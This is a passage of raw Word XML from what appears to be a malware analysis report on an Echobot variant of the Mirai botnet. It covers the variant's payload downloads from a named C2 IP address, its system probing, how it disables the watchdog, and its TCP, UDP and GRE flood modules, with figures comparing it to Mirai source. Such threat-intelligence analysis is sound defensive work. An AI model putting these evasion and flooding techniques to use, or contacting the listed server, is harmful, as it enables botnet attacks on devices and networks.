          <w:bCs/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:t xml:space="preserve">The malware also uses </w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">wget, curl </w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">chmod </w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:t>to interact</w:t>
      </w:r>
      <w:r w:rsidR="00011EF3">
        <w:t xml:space="preserve"> with multiple malicious payloads hosted</w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:t xml:space="preserve"> with</w:t>
      </w:r>
      <w:r w:rsidR="004F0FBC">
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="0009673E">
        <w:t xml:space="preserve"> the C2 server (80.82.67.184)</w:t>
      </w:r>
      <w:r w:rsidR="00011EF3">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A82CDC5" w14:textId="471CD063" w:rsidR="00EB146F" w:rsidRDefault="003A5E89" w:rsidP="00190AD4">
      <w:r>
        <w:t xml:space="preserve">The malware also tries to examine more about target platforms by gathering information about CPU cores and information in </w:t>
      </w:r>
      <w:r w:rsidRPr="008F2C9E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/proc/cpuinfo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and CPU usage in </w:t>
      </w:r>
      <w:r w:rsidRPr="008F2C9E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/proc/stat</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F53B62E" w14:textId="1DEEB64D" w:rsidR="00EB146F" w:rsidRDefault="00EB146F" w:rsidP="00190AD4">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37F8947C" wp14:editId="671C4E68">
            <wp:extent cx="5391147" cy="285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t="1" b="9090"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5391902" cy="285790"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D459DF" w14:textId="5365EA51" w:rsidR="00EB146F" w:rsidRDefault="00EB146F" w:rsidP="00E4577B">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r w:rsidR="00804022">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00E4577B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>This Echobot variant gathers system information as seen in Zelos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8594D9" w14:textId="0D2EE539" w:rsidR="003A5E89" w:rsidRDefault="007F7C3F" w:rsidP="00190AD4">
      <w:r>
        <w:t>When analyzing the malware dynamically via strace and zelos some information gathering syscalls were found:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1C7E3E" w14:textId="0AAC7DD1" w:rsidR="007F7C3F" w:rsidRPr="007F7C3F" w:rsidRDefault="00681AA6" w:rsidP="007F7C3F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidR="007F7C3F" w:rsidRPr="007F7C3F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>etsockopt,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> getsockname,</w:t>
      </w:r>
      <w:r w:rsidR="007F7C3F" w:rsidRPr="007F7C3F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> gettimeofday, getppid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197BCE1C" w14:textId="5EE847BF" w:rsidR="00885E4E" w:rsidRDefault="00885E4E" w:rsidP="00190AD4">
      <w:r>
        <w:t xml:space="preserve">Other functions found in the </w:t>
      </w:r>
      <w:r w:rsidR="00BC51D0">
        <w:t>malware’s non-stripped binary include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5B3E41" w14:textId="561BB6B5" w:rsidR="00885E4E" w:rsidRDefault="00885E4E" w:rsidP="00885E4E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F5305F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>fstat() –</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> To return information on files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003D17D2" w14:textId="77777777" w:rsidR="00885E4E" w:rsidRDefault="00885E4E" w:rsidP="00885E4E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F5305F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>getpage</w:t>
      </w:r>
      <w:r w:rsidR="00F05DF6" w:rsidRPr="00F5305F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r w:rsidRPr="00F5305F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00980A0F">
        <w:t>Returns kernel symbol PAGE_SIZE which is dependent on architecture and machine model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1027D1E3" w14:textId="3BF6BDA3" w:rsidR="006E677F" w:rsidRDefault="006E677F" w:rsidP="006E677F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc101284336"/>
      <w:r>
        <w:t>Defense Evasion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="62EA0589" w14:textId="76944017" w:rsidR="00F5305F" w:rsidRDefault="006E677F" w:rsidP="000B6330">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1305"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00DF2386">
        <w:t xml:space="preserve">his Echobot </w:t>
      </w:r>
      <w:r w:rsidR="000963FA">
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00DF2386">
        <w:t xml:space="preserve">irai variant will try to disable the </w:t>
      </w:r>
      <w:r w:rsidR="00DF2386" w:rsidRPr="00C4486A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>watchdog process</w:t>
      </w:r>
      <w:r w:rsidR="00DF2386">
        <w:t xml:space="preserve"> in infected IoT devices.</w:t>
      </w:r>
      <w:r w:rsidR="000B6330">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00365659">
        <w:t>The watchdog proces</w:t>
      </w:r>
      <w:r w:rsidR="00C4486A">
        <w:t>s is used in embedded systems to monitor if a system is running</w:t>
      </w:r>
      <w:r w:rsidR="00321301">
        <w:t xml:space="preserve"> and will reboot hanged systems by default due to unrecoverable software errors</w:t>
      </w:r>
      <w:r w:rsidR="001825BF">
        <w:t>, booting the system back</w:t>
      </w:r>
      <w:r w:rsidR="0031220A">
        <w:t xml:space="preserve"> into a clean state</w:t>
      </w:r>
      <w:r w:rsidR="00321301">
        <w:t>. This will in turn remove the malware</w:t>
      </w:r>
      <w:r w:rsidR="00205CE7">
        <w:t xml:space="preserve"> which many attackers do not want</w:t>
      </w:r>
      <w:r w:rsidR="00926B88">
        <w:t xml:space="preserve"> so they will try to disable this process whenever they</w:t>
      </w:r>
      <w:r w:rsidR="0059144E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00926B88">
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidR="005C1C6C">
        <w:t xml:space="preserve"> to avoid early detection</w:t>
      </w:r>
      <w:r w:rsidR="00205CE7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700A8BEA" w14:textId="1CDED743" w:rsidR="00205CE7" w:rsidRDefault="003573D3" w:rsidP="000B6330">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1305"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251667456" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7B819368" wp14:editId="2EC73EC7">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>942975</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>5715</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4114800" cy="1822450"/>
            <wp:effectExtent l="0" t="0" r="0" b="635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822450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="013A06BE" w14:textId="51E65B18" w:rsidR="00FE1794" w:rsidRDefault="00FE1794" w:rsidP="00190AD4"/>
    <w:p w14:paraId="0D4188D4" w14:textId="3241383D" w:rsidR="003573D3" w:rsidRDefault="003573D3" w:rsidP="00413A6D">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B174452" w14:textId="5EE8F62E" w:rsidR="003573D3" w:rsidRDefault="003573D3" w:rsidP="00190AD4"/>
    <w:p w14:paraId="2A3927DE" w14:textId="5DD340F8" w:rsidR="003573D3" w:rsidRDefault="003573D3" w:rsidP="00190AD4"/>
    <w:p w14:paraId="0C706188" w14:textId="122E075D" w:rsidR="003573D3" w:rsidRDefault="003573D3" w:rsidP="00190AD4"/>
    <w:p w14:paraId="0ADD3CA7" w14:textId="1718A1D8" w:rsidR="003573D3" w:rsidRDefault="003573D3" w:rsidP="00190AD4"/>
    <w:p w14:paraId="32900C86" w14:textId="78403CB5" w:rsidR="0086428A" w:rsidRPr="001F4F1E" w:rsidRDefault="00413A6D" w:rsidP="00413A6D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r w:rsidR="0086428A" w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="0086428A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="0086428A" w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00804022">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="0086428A" w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="0086428A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Prevention of watchdog process</w:t>
      </w:r>
      <w:r w:rsidR="00A11554">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> rebooting in infected devices </w:t>
      </w:r>
      <w:r w:rsidR="0086428A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="00A11554">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> both</w:t>
      </w:r>
      <w:r w:rsidR="0086428A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Mirai and Echobot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743998EA" w14:textId="65DF101C" w:rsidR="00EE6C41" w:rsidRDefault="00656451" w:rsidP="00656451">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1260"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When analyzing the malware’s system calls dynamically via zelos we </w:t>
      </w:r>
      <w:r w:rsidR="00816865">
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> see the malware trying to </w:t>
      </w:r>
      <w:r w:rsidR="00E90805">
        <w:t>open</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009718A3">
        <w:t>and edit the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> watchdog process in both </w:t>
      </w:r>
      <w:r w:rsidRPr="00656451">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">/dev/watchdog </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidRPr="00656451">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/dev/misc/watchdog</w:t>
      </w:r>
      <w:r w:rsidR="00E90805">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E90805">
        <w:t>to prevent watchdog from rebooting devices</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308FA01F" w14:textId="4E843234" w:rsidR="00816865" w:rsidRDefault="00816865" w:rsidP="00656451">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1260"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44BCF72E" wp14:editId="0E25FBD0">
            <wp:extent cx="594360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14:paraId="2A7ABFCB" w14:textId="06E65584" w:rsidR="00656451" w:rsidRDefault="000262A5" w:rsidP="006057D2">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">                      </w:t>
      </w:r>
      <w:r w:rsidR="00656451" w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00656451">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00656451" w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00804022">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00656451" w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00656451">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Prevention of watchdog process rebooting seen in </w:t>
      </w:r>
      <w:r w:rsidR="00EE6C41">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r w:rsidR="00656451">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>elos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07937AD7" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc101284337"/>
      <w:r>
        <w:t>Mirai DdoS Functionality</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="3FDC303F" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:r>
        <w:t>Echobot contains many malicious capabilities used to attack networks and systems which we can analyze and correlate alongside the original Mirai source code. Interestingly enough, this custom variant does not use HTTP flooding as one of its many main attack vectors. The following attack vectors this Echobot variant uses is listed below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D33A5D1" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00200B5E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="002060"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>TCP Flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00200B5E">
        <w:rPr>
          <w:color w:val="002060"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>– This Echobot Mirai variant performs multiple TCP flood attacks including SYN, ACK, XMAS and STOMP. These type of TCP attacks exploit the normal TCP 3-way handshake to consume more bandwidth and resources to disrupt victim servers and services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416D4753" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C750AFC" wp14:editId="655952B8">
            <wp:extent cx="5943600" cy="279019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1856137F" w14:textId="3B239908" w:rsidR="002A0079" w:rsidRPr="00C92F0E" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="center" w:pos="4680"/>
        </w:tabs>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00256EBE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Comparison of TCP-SYN Mirai Module and Echobot TCP-SYN Module</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3936A888" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00200B5E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="002060"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>UDP Flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00200B5E">
        <w:rPr>
          <w:color w:val="002060"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>– This Echobot Mirai variant can perform UDP Flooding attacks including VSE, DNS and UDPPLAIN. The threat actor is able to send multiple UDP packets to overwhelm a victim’s server and to lag responses and disrupt services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EC487F" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="68D6AAD2" wp14:editId="7BAE35F8">
            <wp:extent cx="5943600" cy="293624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5D082" w14:textId="62951253" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00256EBE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Comparison of UDP Flood Mirai Module and Echobot UDP Flood Module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3CD0B1" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB0D68">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="002060"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>GRE Ethernet Flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB0D68">
        <w:rPr>
          <w:color w:val="002060"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>– This Echobot Mirai variant can perform GRE Ethernet flood attacks including GREIP and GREETH. In GRE flooding attacks, the threat actor will encapsulate packets with large amounts of data and route them to a victim’s network to exhaust network resources to de-encapsulate the packet payloads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371EBD86" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="33A0E26A" wp14:editId="31F76A1A">
            <wp:extent cx="5810250" cy="3114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l="2244" t="9419"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5810250" cy="3114675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31598020" w14:textId="1A9E45A4" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00256EBE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Comparison of GRE Flood Mirai Module and Echobot GRE Flood Module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51950B63" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00200B5E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="002060"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>STD Attack</w:t>
      </w:r>
      <w:r w:rsidRPr="00200B5E">
        <w:rPr>
          <w:color w:val="002060"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>– Echobot seems to implement a different attack vector from the original Mirai source code where the malware can send packets similar to a UDPPLAIN attack. Instead of sending the usual 512 bytes payload, the STD attack would send 1024 bytes instead. This has also been implemented in newer Mirai variants such as Owari.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE2C4E8" w14:textId="77777777" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="26E8A2A5" wp14:editId="2C075FEA">
            <wp:extent cx="5943600" cy="29032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5FA8E05B" w14:textId="3E2756EB" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
